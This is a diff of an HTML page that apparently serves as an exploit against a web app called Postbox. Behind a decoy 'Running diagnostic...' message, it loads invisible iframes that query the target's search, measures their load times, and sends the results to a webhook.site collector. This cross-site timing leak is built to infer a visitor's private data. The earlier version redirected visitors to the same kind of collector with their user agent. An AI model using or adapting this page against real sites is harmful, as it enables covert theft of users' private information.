@@ -1,14 +1,97 @@
 
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Postbox Test</title>
+  <title>Postbox Probe</title>
 </head>
 <body>
-<script>
-const WEBHOOK = "https://webhook.site/1799e234-d61b-46b3-9a26-add6ed132d0b";
-location.href = WEBHOOK + "?visited=1&ua=" + encodeURIComponent(navigator.userAgent);
-</script>
+  <p>Running diagnostic...</p>
+
+  <script>
+    const APP = "https://0ce7a889dea53f95.postbox.best";
+
+    const HOOK = "https://webhook.site/1b17403e-86a9-48a5-bd2e-c8dfbb4ef5c9";
+
+    const tests = [
+      "Recovery",
+      "zzzznotfound987654",
+      "Recovery",
+      "zzzznotfound987654",
+      "Recovery",
+      "zzzznotfound987654"
+    ];
+
+    const samples = [];
+
+    function ping(data) {
+      new Image().src =
+        HOOK + "?" +
+        new URLSearchParams(data).toString() +
+        "&r=" + Math.random();
+    }
+
+    async function run() {
+      ping({
+        phase: "start",
+        origin: location.origin
+      });
+
+      for (const term of tests) {
+        const frame = document.createElement("iframe");
+
+        frame.style.cssText =
+          "position:absolute;width:1px;height:1px;" +
+          "opacity:0;pointer-events:none";
+
+        const start = performance.now();
+
+        const result = await new Promise(resolve => {
+          const timeout = setTimeout(() => {
+            resolve("timeout");
+          }, 3000);
+
+          frame.onload = () => {
+            clearTimeout(timeout);
+            resolve("load");
+          };
+
+          frame.onerror = () => {
+            clearTimeout(timeout);
+            resolve("error");
+          };
+
+          frame.src =
+            APP + "/?q=" +
+            encodeURIComponent(term) +
+            "&t=" + Math.random();
+
+          document.body.appendChild(frame);
+        });
+
+        samples.push({
+          term: term,
+          ms: Math.round(performance.now() - start),
+          result: result
+        });
+
+        frame.remove();
+      }
+
+      ping({
+        phase: "done",
+        data: JSON.stringify(samples)
+      });
+
+      document.body.textContent = "Diagnostic complete.";
+    }
+
+    run().catch(error => {
+      ping({
+        phase: "error",
+        message: String(error)
+      });
+    });
+  </script>
 </body>
 </html>
